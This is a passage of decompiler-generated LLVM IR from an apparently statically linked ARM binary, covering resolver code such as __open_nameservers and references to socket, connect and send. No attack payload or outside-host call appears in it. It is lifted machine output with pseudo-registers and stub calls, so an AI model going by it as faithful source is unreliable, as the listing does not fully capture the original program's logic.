  store i32 %v1_15a54, i32* @r4, align 4
  %v5_15a5c = icmp slt i32 %v6_15a5c, %v1_15a54
  br i1 %v5_15a5c, label %.thread27, label %dec_label_pc_15a64

.thread27:                                        ; preds = %dec_label_pc_15a08
  %v7_15a5c = add i32 %v6_15a5c, 1
  br label %dec_label_pc_15a94.backedge

dec_label_pc_15a64:                               ; preds = %dec_label_pc_15a08, %dec_label_pc_159fc
  %v0_15a64 = load i32, i32* @sl, align 4
  %v1_15a64 = add i32 %v0_15a64, 1
  %v2_15a6c = srem i32 %v1_15a64, %arg3
  store i32 %v2_15a6c, i32* @sl, align 4
  %v2_15a70 = icmp eq i32 %v2_15a6c, 0
  br i1 %v2_15a70, label %dec_label_pc_15a78, label %dec_label_pc_15a94.backedge

dec_label_pc_15a78:                               ; preds = %dec_label_pc_15a64
  %v1_15a80 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_15a98.outer.backedge

dec_label_pc_15a94.backedge:                      ; preds = %dec_label_pc_159c8, %dec_label_pc_15a64, %.thread27
  %storemerge87 = phi i32 [ %v7_15a5c, %.thread27 ], [ -1, %dec_label_pc_15a64 ], [ -1, %dec_label_pc_159c8 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_1547c.lr.ph.preheader, label %dec_label_pc_15ab4

dec_label_pc_1547c.lr.ph.preheader:               ; preds = %dec_label_pc_1547c.lr.ph.preheader.lr.ph, %dec_label_pc_15a94.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_1547c.lr.ph.preheader.lr.ph ], [ %v0_1562c, %dec_label_pc_15a94.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_15474, %dec_label_pc_1547c.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_15a94.backedge ]
  %v0_15a94259 = phi i32 [ -1, %dec_label_pc_1547c.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_15a94.backedge ]
  br label %dec_label_pc_1547c.lr.ph

dec_label_pc_1547c.lr.ph:                         ; preds = %dec_label_pc_1547c.lr.ph.preheader, %dec_label_pc_15a98.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v0_1562c, %dec_label_pc_15a98.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_1547c.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_15a98.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_1547c.lr.ph.preheader ]
  %v6_15a5c = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_15a98.outer.backedge ], [ %v0_15a94259, %dec_label_pc_1547c.lr.ph.preheader ]
  %v1_15524 = icmp slt i32 %v6_15a5c, 0
  %v4_15560 = mul i32 %v6_15a5c, 4
  %v5_15560 = add i32 %v4_15560, ptrtoint (i32* @global_var_29e50.883 to i32)
  %v6_15560 = inttoptr i32 %v5_15560 to i32*
  br label %dec_label_pc_1547c

dec_label_pc_15aa8:                               ; preds = %bb195, %.thread8, %dec_label_pc_153d4, %dec_label_pc_153c8
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_15ab4

dec_label_pc_15ab4:                               ; preds = %dec_label_pc_153e4, %dec_label_pc_15a94.backedge, %dec_label_pc_15a98.outer.backedge, %bb200, %dec_label_pc_1556c, %dec_label_pc_15a98.backedge, %dec_label_pc_15aa8
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_15aa8 ], [ %v0_1562c, %dec_label_pc_15a98.backedge ], [ %v1_15484, %dec_label_pc_1556c ], [ %v1_15484, %bb200 ], [ %v0_1562c, %dec_label_pc_15a98.outer.backedge ], [ -1, %dec_label_pc_153e4 ], [ %v0_1562c, %dec_label_pc_15a94.backedge ]
  %v0_15ab4 = call i32 @__GI___h_errno_location()
  %v2_15abc = inttoptr i32 %v0_15ab4 to i32*
  store i32 -1, i32* %v2_15abc, align 4
  %v0_15ac0 = load i32, i32* @sb, align 4
  store i32 %v0_15ac0, i32* @r6, align 4
  br label %dec_label_pc_15ac4

dec_label_pc_15ac4:                               ; preds = %dec_label_pc_157b0, %dec_label_pc_15ab4
  %v1_15acc = phi i32 [ %stack_var_-216.2, %dec_label_pc_15ab4 ], [ %v0_1562c, %dec_label_pc_157b0 ]
  %v7_15ac8 = icmp eq i32 %v1_15acc, -1
  br i1 %v7_15ac8, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_15ac4
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_15ac4, %bb208
  store i32 88788, i32* @lr, align 4
  %v1_15ad0 = xor i1 %v7_15ac8, true
  call void @__pseudo_cond_branch(i1 %v1_15ad0, i32 ptrtoint (i32* @global_var_f738.876 to i32))
  %v2_15ad4 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_15ad4, i32* @r0, align 4
  %v0_15ad8 = call i32 @free()
  %v0_15adc = load i32, i32* @r7, align 4
  store i32 %v0_15adc, i32* @r0, align 4
  %v0_15ae0 = call i32 @free()
  %v0_15ae4 = load i32, i32* @sl, align 4
  %v7_15ae4 = icmp eq i32 %v0_15ae4, -1
  br i1 %v7_15ae4, label %bb210, label %dec_label_pc_15af0

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_15b4c

dec_label_pc_15af0:                               ; preds = %bb209
  %v2_15af0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_15af0, i32* @r0, align 4
  %v1_15b08 = call i32 @__pthread_return_void()
  %v1_15b18 = call i32 @__pthread_return_0()
  %v0_15b24 = load i32, i32* @r6, align 4
  %v3_15b24 = sdiv i32 %v0_15b24, 256
  store i32 %v3_15b24, i32* @ip, align 4
  %v0_15b28 = load i32, i32* @sl, align 4
  store i32 %v0_15b28, i32* @global_var_29da0.871, align 4
  store i32 %v2_15af0, i32* @r0, align 4
  %v1_15b34 = trunc i32 %v3_15b24 to i8
  store i8 %v1_15b34, i8* @global_var_23aed.874, align 1
  %v1_15b38 = trunc i32 %v0_15b24 to i8
  store i8 %v1_15b38, i8* bitcast (i8** @global_var_23aec.873 to i8*), align 4
  store i32 88904, i32* @lr, align 4
  %v1_15b44 = call i32 @__pthread_return_void()
  br label %dec_label_pc_15b4c

dec_label_pc_15b4c:                               ; preds = %bb210, %bb207, %dec_label_pc_15af0
  %v0_15b4c = phi i32 [ %v0_15ae4, %bb210 ], [ %v0_15b4c.pre, %bb207 ], [ -1, %dec_label_pc_15af0 ]
  store i32 %v3_15380, i32* @r4, align 4
  store i32 %v6_15380, i32* @r5, align 4
  store i32 %v9_15380, i32* @r6, align 4
  store i32 %v12_15380, i32* @r7, align 4
  store i32 %v15_15380, i32* @r8, align 4
  store i32 %v18_15380, i32* @sb, align 4
  store i32 %v21_15380, i32* @sl, align 4
  ret i32 %v0_15b4c

; uselistorder directives
  uselistorder i32 %v3_15b24, { 1, 0 }
  uselistorder i32 %v0_15b24, { 1, 0 }
  uselistorder i32 %v0_15ae4, { 1, 0 }
  uselistorder i1 %v7_15ac8, { 1, 0 }
  uselistorder i32 %v6_15a5c, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v3_159a0, { 1, 0 }
  uselistorder i32 %v0_159a0, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_157f4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_158ec, { 0, 2, 1, 3 }
  uselistorder i32 %v1_158ac, { 1, 0 }
  uselistorder i32 %v0_157cc, { 1, 0 }
  uselistorder i32 %v0_157d0, { 1, 0 }
  uselistorder i32 %v6_156d0, { 1, 0 }
  uselistorder i32 %v0_1562c, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_15598, { 1, 0 }
  uselistorder i32 %v2_15538, { 1, 0 }
  uselistorder i32 %v1_154b0, { 1, 2, 0 }
  uselistorder i1 %v7_15480, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_15484, { 1, 2, 0 }
  uselistorder i32 %v0_15474, { 1, 0 }
  uselistorder i32 %v2_153f8, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_close, { 11, 14, 13, 12, 17, 16, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_send, { 8, 7, 0, 1, 2, 3, 4, 5, 6, 9, 10, 11, 12 }
  uselistorder i32 101, { 5, 1, 2, 3, 0, 4 }
  uselistorder i32 (i32, %sockaddr*, i32)* @__libc_connect, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 ()* @socket, { 1, 9, 2, 7, 6, 5, 4, 3, 8, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 3 }
  uselistorder i8* @global_var_23aed.874, { 2, 1, 0 }
  uselistorder i32 512, { 3, 8, 2, 9, 1, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_15b4c, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_15ac4, { 1, 0 }
  uselistorder label %dec_label_pc_15ab4, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_15aa8, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1547c.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15a94.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_159fc, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_15a98.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_159c8, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_15948, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_15934, { 1, 0 }
  uselistorder label %dec_label_pc_15920, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1591c, { 1, 0 }
  uselistorder label %dec_label_pc_15884, { 1, 0, 2 }
  uselistorder label %dec_label_pc_157c0, { 1, 0 }
  uselistorder label %dec_label_pc_157b0, { 1, 0 }
  uselistorder label %dec_label_pc_15a98.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15618, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_1556c, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15b58:
  %v0_15b58 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15b58, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15b58
  %v5_15b58 = mul i32 %arg2, 256
  %v6_15b58 = and i32 %v5_15b58, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15b58, %bb
  %v10_15b88 = phi i32 [ %arg1, %dec_label_pc_15b58 ], [ %v6_15b58, %bb ]
  ret i32 %v10_15b88

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_15b8c = load i32, i32* @r4, align 4
  store i32 %v3_15b8c, i32* %stack_var_-28, align 4
  %v6_15b8c = load i32, i32* @r5, align 4
  %v9_15b8c = load i32, i32* @r6, align 4
  %v12_15b8c = load i32, i32* @r7, align 4
  %v15_15b8c = load i32, i32* @r8, align 4
  %v18_15b8c = load i32, i32* @sl, align 4
  %v2_15b90 = ptrtoint i32* %stack_var_-192 to i32
  %v2_15b94 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_15b94, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23af0.716 to i32), i32* %r2.global-to-local, align 4
  %v1_15ba8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_23af0.716 to i32), i32* %r0.global-to-local, align 4
  store i32 89020, i32* @lr, align 4
  %v1_15bb8 = call i32 @__pthread_return_0()
  store i32 %v1_15bb8, i32* %r0.global-to-local, align 4
  %v2_15bc0 = load i32, i32* @global_var_29e6c.721, align 4
  %v5_15bc8 = icmp sgt i32 %v2_15bc0, 0
  br i1 %v5_15bc8, label %dec_label_pc_15e04, label %dec_label_pc_15bcc

dec_label_pc_15bcc:                               ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1b04c.892 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b060.894 to i32), i32* @r1, align 4
  %v3_15bd4 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1b04c.892 to i32), i32 ptrtoint (i32* @global_var_1b060.894 to i32))
  store i32 %v3_15bd4, i32* %r0.global-to-local, align 4
  store i32 %v3_15bd4, i32* @sl, align 4
  %v2_15bd8 = icmp eq i32 %v3_15bd4, 0
  br i1 %v2_15bd8, label %dec_label_pc_15be0, label %dec_label_pc_15dcc.preheader

dec_label_pc_15be0:                               ; preds = %dec_label_pc_15bcc
  store i32 ptrtoint ([24 x i8]* @global_var_1b064.896 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b060.894 to i32), i32* @r1, align 4
  %v3_15be8 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1b064.896 to i32), i32 ptrtoint (i32* @global_var_1b060.894 to i32))
  store i32 %v3_15be8, i32* %r0.global-to-local, align 4
  store i32 %v3_15be8, i32* @sl, align 4
  %v2_15bec = icmp eq i32 %v3_15be8, 0
  br i1 %v2_15bec, label %dec_label_pc_15df8, label %dec_label_pc_15dcc.preheader

dec_label_pc_15dcc.preheader:                     ; preds = %dec_label_pc_15bcc, %dec_label_pc_15be0
  %v0_15dd426 = phi i32 [ %v3_15bd4, %dec_label_pc_15bcc ], [ %v3_15be8, %dec_label_pc_15be0 ]
  %v2_15c40 = ptrtoint i32* %stack_var_-28 to i32
  %v3_15cdc = inttoptr i32 %tmp to i8*
  store i32 %v2_15b90, i32* %r0.global-to-local, align 4
  store i32 %v0_15dd426, i32* %r2.global-to-local, align 4
  %v3_15dd866 = call i32 @fgets(i32 %v2_15b90, i32 128, i32 %v0_15dd426)
  store i32 %v3_15dd866, i32* %r0.global-to-local, align 4
  %v2_15ddc68 = icmp eq i32 %v3_15dd866, 0
  store i32 %v2_15b90, i32* @r4, align 4
  br i1 %v2_15ddc68, label %dec_label_pc_15dec, label %dec_label_pc_15bfc.preheader.lr.ph

dec_label_pc_15bfc.preheader.lr.ph:               ; preds = %dec_label_pc_15dcc.preheader
  %v1_15bfc11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_15bfc.preheader

dec_label_pc_15bf8:                               ; preds = %dec_label_pc_15c08
  %v1_15bf8 = add i32 %v0_15bf8, 1
  store i32 %v1_15bf8, i32* %r0.global-to-local, align 4
  %v1_15bfc = inttoptr i32 %v1_15bf8 to i8*
  %v2_15bfc = load i8, i8* %v1_15bfc, align 1
  %v3_15bfc = zext i8 %v2_15bfc to i32
  store i32 %v3_15bfc, i32* %r2.global-to-local, align 4
  %v2_15c00 = icmp eq i8 %v2_15bfc, 0
  br i1 %v2_15c00, label %dec_label_pc_15c1c, label %dec_label_pc_15c08

dec_label_pc_15c08:                               ; preds = %dec_label_pc_15c08.lr.ph, %dec_label_pc_15bf8
  %v0_15bf8 = phi i32 [ %v2_15b90, %dec_label_pc_15c08.lr.ph ], [ %v1_15bf8, %dec_label_pc_15bf8 ]
  %v1_15c10 = phi i32 [ %v3_15bfc13, %dec_label_pc_15c08.lr.ph ], [ %v3_15bfc, %dec_label_pc_15bf8 ]
  %v3_15c10 = mul nuw nsw i32 %v1_15c10, 2
  %v4_15c10 = add i32 %v3_15c10, %v2_15c0c.pre
  %v5_15c10 = inttoptr i32 %v4_15c10 to i8*
  %v6_15c10 = load i8, i8* %v5_15c10, align 1
  %v1_15c14 = and i8 %v6_15c10, 32
  %v2_15c14 = icmp eq i8 %v1_15c14, 0
  br i1 %v2_15c14, label %dec_label_pc_15c1c, label %dec_label_pc_15bf8

dec_label_pc_15c1c:                               ; preds = %dec_label_pc_15bf8, %dec_label_pc_15c08, %dec_label_pc_15bfc.preheader
  %v0_15cb435 = phi i32 [ %v2_15b90, %dec_label_pc_15bfc.preheader ], [ %v1_15bf8, %dec_label_pc_15bf8 ], [ %v0_15bf8, %dec_label_pc_15c08 ]
  %v0_15c30 = phi i32 [ %v3_15bfc13, %dec_label_pc_15bfc.preheader ], [ %v3_15bfc, %dec_label_pc_15bf8 ], [ %v1_15c10, %dec_label_pc_15c08 ]
  %v7_15c1c = icmp eq i32 %v0_15c30, 10
  br i1 %v7_15c1c, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_15c1c
  %v3_15c20 = icmp eq i32 %v0_15c30, 0
  br i1 %v3_15c20, label %bb55, label %dec_label_pc_15c30

.thread3:                                         ; preds = %dec_label_pc_15c1c
  br label %dec_label_pc_15dcc.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_15dcc.backedge

dec_label_pc_15dcc.backedge:                      ; preds = %dec_label_pc_15da8, %dec_label_pc_15dc0, %bb55, %dec_label_pc_15d40, %.thread3, %dec_label_pc_15c30
  %v0_15dd4.pre = load i32, i32* @sl, align 4
  store i32 %v2_15b90, i32* %r0.global-to-local, align 4
  store i32 %v0_15dd4.pre, i32* %r2.global-to-local, align 4
  %v3_15dd8 = call i32 @fgets(i32 %v2_15b90, i32 128, i32 %v0_15dd4.pre)
  store i32 %v3_15dd8, i32* %r0.global-to-local, align 4
  %v2_15ddc = icmp eq i32 %v3_15dd8, 0
  store i32 %v2_15b90, i32* @r4, align 4
  br i1 %v2_15ddc, label %dec_label_pc_15dec, label %dec_label_pc_15bfc.preheader

dec_label_pc_15c30:                               ; preds = %bb
  %v7_15c30 = icmp eq i32 %v0_15c30, 35
  br i1 %v7_15c30, label %dec_label_pc_15dcc.backedge, label %dec_label_pc_15cb4

dec_label_pc_15c40:                               ; preds = %bb58
  store i32 %v2_15c40, i32* %r2.global-to-local, align 4
  %v4_15c44 = mul i32 %storemerge, 4
  %v5_15c44 = add i32 %v4_15c44, %v2_15c40
  %v2_15c48 = add i32 %v5_15c44, -36
  %v3_15c48 = inttoptr i32 %v2_15c48 to i32*
  store i32 %v0_15c48, i32* %v3_15c48, align 4
  %v0_15c5415 = load i32, i32* %r0.global-to-local, align 4
  %v1_15c5416 = inttoptr i32 %v0_15c5415 to i8*
  %v2_15c5417 = load i8, i8* %v1_15c5416, align 1
  %v3_15c5418 = zext i8 %v2_15c5417 to i32
  store i32 %v3_15c5418, i32* %r2.global-to-local, align 4
  %v2_15c5819 = icmp eq i8 %v2_15c5417, 0
  br i1 %v2_15c5819, label %dec_label_pc_15c88.preheader, label %dec_label_pc_15c60.lr.ph

dec_label_pc_15c60.lr.ph:                         ; preds = %dec_label_pc_15c40
  %v2_15c64.pre = load i32, i32* @global_var_237ac, align 4
  br label %dec_label_pc_15c60

dec_label_pc_15c50:                               ; preds = %dec_label_pc_15c74
  %v1_15c50 = add i32 %v0_15c50, 1
  store i32 %v1_15c50, i32* %r0.global-to-local, align 4
  %v1_15c54 = inttoptr i32 %v1_15c50 to i8*
  %v2_15c54 = load i8, i8* %v1_15c54, align 1
  %v3_15c54 = zext i8 %v2_15c54 to i32
  store i32 %v3_15c54, i32* %r2.global-to-local, align 4
  %v2_15c58 = icmp eq i8 %v2_15c54, 0
  br i1 %v2_15c58, label %dec_label_pc_15c88.preheader, label %dec_label_pc_15c60

dec_label_pc_15c60:                               ; preds = %dec_label_pc_15c60.lr.ph, %dec_label_pc_15c50
  %v0_15c50 = phi i32 [ %v0_15c5415, %dec_label_pc_15c60.lr.ph ], [ %v1_15c50, %dec_label_pc_15c50 ]
  %v0_15c74 = phi i32 [ %v3_15c5418, %dec_label_pc_15c60.lr.ph ], [ %v3_15c54, %dec_label_pc_15c50 ]
  %v3_15c68 = mul nuw nsw i32 %v0_15c74, 2
  %v4_15c68 = add i32 %v3_15c68, %v2_15c64.pre
  %v5_15c68 = inttoptr i32 %v4_15c68 to i8*
  %v6_15c68 = load i8, i8* %v5_15c68, align 1
  %v1_15c6c = and i8 %v6_15c68, 32
  %v2_15c6c = icmp eq i8 %v1_15c6c, 0
  br i1 %v2_15c6c, label %dec_label_pc_15c74, label %dec_label_pc_15c88.preheader

dec_label_pc_15c74:                               ; preds = %dec_label_pc_15c60
  %v7_15c74 = icmp eq i32 %v0_15c74, 10
  br i1 %v7_15c74, label %dec_label_pc_15c88.preheader, label %dec_label_pc_15c50

dec_label_pc_15c88.preheader:                     ; preds = %dec_label_pc_15c74, %dec_label_pc_15c60, %dec_label_pc_15c50, %dec_label_pc_15c40
  %v0_15c8820 = phi i32 [ %v0_15c5415, %dec_label_pc_15c40 ], [ %v0_15c50, %dec_label_pc_15c74 ], [ %v0_15c50, %dec_label_pc_15c60 ], [ %v1_15c50, %dec_label_pc_15c50 ]
  %v1_15c8821 = inttoptr i32 %v0_15c8820 to i8*
  %v2_15c8822 = load i8, i8* %v1_15c8821, align 1
  %v3_15c8823 = zext i8 %v2_15c8822 to i32
  store i32 %v3_15c8823, i32* %r2.global-to-local, align 4
  %v2_15c8c24 = icmp eq i8 %v2_15c8822, 0
  br i1 %v2_15c8c24, label %dec_label_pc_15cb0, label %dec_label_pc_15c94

dec_label_pc_15c80:                               ; preds = %dec_label_pc_15c94, %dec_label_pc_15ca8
  %v3_15c84 = inttoptr i32 %v2_15c84 to i8*
  store i8 0, i8* %v3_15c84, align 1
  %v4_15c84 = load i32, i32* %r0.global-to-local, align 4
  %v5_15c84 = add i32 %v4_15c84, 1
  store i32 %v5_15c84, i32* %r0.global-to-local, align 4
  %v1_15c88 = inttoptr i32 %v5_15c84 to i8*
  %v2_15c88 = load i8, i8* %v1_15c88, align 1
  %v3_15c88 = zext i8 %v2_15c88 to i32
  store i32 %v3_15c88, i32* %r2.global-to-local, align 4
  %v2_15c8c = icmp eq i8 %v2_15c88, 0
  br i1 %v2_15c8c, label %dec_label_pc_15cb0, label %dec_label_pc_15c94

dec_label_pc_15c94:                               ; preds = %dec_label_pc_15c88.preheader, %dec_label_pc_15c80
  %v0_15ca8 = phi i32 [ %v3_15c88, %dec_label_pc_15c80 ], [ %v3_15c8823, %dec_label_pc_15c88.preheader ]
  %v2_15c84 = phi i32 [ %v5_15c84, %dec_label_pc_15c80 ], [ %v0_15c8820, %dec_label_pc_15c88.preheader ]
  %v2_15c98 = load i32, i32* @global_var_237ac, align 4
  %v3_15c9c = mul nuw nsw i32 %v0_15ca8, 2
  %v4_15c9c = add i32 %v2_15c98, %v3_15c9c
  %v5_15c9c = inttoptr i32 %v4_15c9c to i8*
  %v6_15c9c = load i8, i8* %v5_15c9c, align 1
  %v1_15ca0 = and i8 %v6_15c9c, 32
  %v2_15ca0 = icmp eq i8 %v1_15ca0, 0
  br i1 %v2_15ca0, label %dec_label_pc_15ca8, label %dec_label_pc_15c80

dec_label_pc_15ca8:                               ; preds = %dec_label_pc_15c94
  %v7_15ca8 = icmp eq i32 %v0_15ca8, 10
  br i1 %v7_15ca8, label %dec_label_pc_15c80, label %dec_label_pc_15cb0

dec_label_pc_15cb0:                               ; preds = %dec_label_pc_15c80, %dec_label_pc_15ca8, %dec_label_pc_15c88.preheader
  %v0_15cb434 = phi i32 [ %v0_15c8820, %dec_label_pc_15c88.preheader ], [ %v5_15c84, %dec_label_pc_15c80 ], [ %v2_15c84, %dec_label_pc_15ca8 ]
  %v0_15cb0 = load i32, i32* @r8, align 4
  %v1_15cb0 = add i32 %v0_15cb0, 1
  br label %dec_label_pc_15cb4

dec_label_pc_15cb4:                               ; preds = %dec_label_pc_15c30, %dec_label_pc_15cb0
  %storemerge = phi i32 [ %v1_15cb0, %dec_label_pc_15cb0 ], [ 0, %dec_label_pc_15c30 ]
  %v0_15c48 = phi i32 [ %v0_15cb434, %dec_label_pc_15cb0 ], [ %v0_15cb435, %dec_label_pc_15c30 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_15cb4 = inttoptr i32 %v0_15c48 to i8*
  %v2_15cb4 = load i8, i8* %v1_15cb4, align 1
  %v3_15cb4 = zext i8 %v2_15cb4 to i32
  %v2_15cb8 = icmp eq i8 %v2_15cb4, 0
  br i1 %v2_15cb8, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_15cb4
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_15cb4, %bb56
  %v0_15cc8.pr = phi i32 [ %v3_15cb4, %dec_label_pc_15cb4 ], [ 1, %bb56 ]
  %v1_15cc0 = add i32 %storemerge, -4
  %v3_15cc0 = sub i32 3, %storemerge
  %v4_15cc0 = and i32 %v3_15cc0, %storemerge
  %v5_15cc0 = icmp slt i32 %v4_15cc0, 0
  %v6_15cc0 = icmp slt i32 %v1_15cc0, 0
  %v7_15cc0 = icmp eq i32 %storemerge, 4
  %v3_15cc4 = xor i1 %v6_15cc0, %v5_15cc0
  %v4_15cc4 = or i1 %v7_15cc0, %v3_15cc4
  br i1 %v4_15cc4, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_15cd0

bb58:                                             ; preds = %bb57
  %v2_15cc8 = icmp eq i32 %v0_15cc8.pr, 0
  br i1 %v2_15cc8, label %dec_label_pc_15cd0, label %dec_label_pc_15c40

dec_label_pc_15cd0:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1b07c.899 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_15cdc = call i32 @__GI_strcoll(i8* %v3_15cdc, i32 ptrtoint ([11 x i8]* @global_var_1b07c.899 to i32))
  store i32 %v4_15cdc, i32* %r0.global-to-local, align 4
  %v2_15ce0 = icmp eq i32 %v4_15cdc, 0
  br i1 %v2_15ce0, label %dec_label_pc_15d08.preheader, label %dec_label_pc_15d2c

dec_label_pc_15d08.preheader:                     ; preds = %dec_label_pc_15cd0
  br label %dec_label_pc_15d08

dec_label_pc_15cf0:                               ; preds = %dec_label_pc_15d20
  %v1_15cf0 = add i32 %v5_15d10, -36
  %v2_15cf0 = inttoptr i32 %v1_15cf0 to i32*
  %v3_15cf0 = load i32, i32* %v2_15cf0, align 4
  store i32 %v3_15cf0, i32* %r0.global-to-local, align 4
  %v1_15cf4 = inttoptr i32 %v3_15cf0 to i8*
  %v2_15cf4 = call i32 @__GI_strdup(i8* %v1_15cf4)
  store i32 %v2_15cf4, i32* %r0.global-to-local, align 4
  %v0_15cfc = load i32, i32* @r4, align 4
  %v1_15cfc = add i32 %v0_15cfc, 1
  store i32 %v1_15cfc, i32* %r2.global-to-local, align 4
  %v5_15d00 = mul i32 %v0_15cfc, 4
  %v6_15d00 = add i32 %v5_15d00, ptrtoint (i32* @global_var_29e60.724 to i32)
  %v7_15d00 = inttoptr i32 %v6_15d00 to i32*
  store i32 %v2_15cf4, i32* %v7_15d00, align 4
  %v0_15d04 = load i32, i32* %r2.global-to-local, align 4
  %v1_15d04 = load i32, i32* @r7, align 4
  %v2_15d04 = inttoptr i32 %v1_15d04 to i32*
  store i32 %v0_15d04, i32* %v2_15d04, align 4
  %v0_15d0c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15d08

dec_label_pc_15d08:                               ; preds = %dec_label_pc_15d08.preheader, %dec_label_pc_15cf0
  %v0_15d18 = phi i32 [ 1, %dec_label_pc_15d08.preheader ], [ %v0_15d0c.pre, %dec_label_pc_15cf0 ]
  store i32 %v2_15c40, i32* %r2.global-to-local, align 4
  %v1_15d0c = load i32, i32* @r8, align 4
  %v2_15d0c = sub i32 %v0_15d18, %v1_15d0c
  %v4_15d0c = xor i32 %v1_15d0c, %v0_15d18
  %v5_15d0c = xor i32 %v2_15d0c, %v0_15d18
  %v6_15d0c = and i32 %v5_15d0c, %v4_15d0c
  %v7_15d0c = icmp slt i32 %v6_15d0c, 0
  %v8_15d0c = icmp slt i32 %v2_15d0c, 0
  %v4_15d10 = mul i32 %v0_15d18, 4
  %v5_15d10 = add i32 %v4_15d10, %v2_15c40
  store i32 ptrtoint (i32* @global_var_29e6c.721 to i32), i32* @r7, align 4
  %v1_15d18 = add i32 %v0_15d18, 1
  store i32 %v1_15d18, i32* @r5, align 4
  %v2_15d1c = xor i1 %v8_15d0c, %v7_15d0c
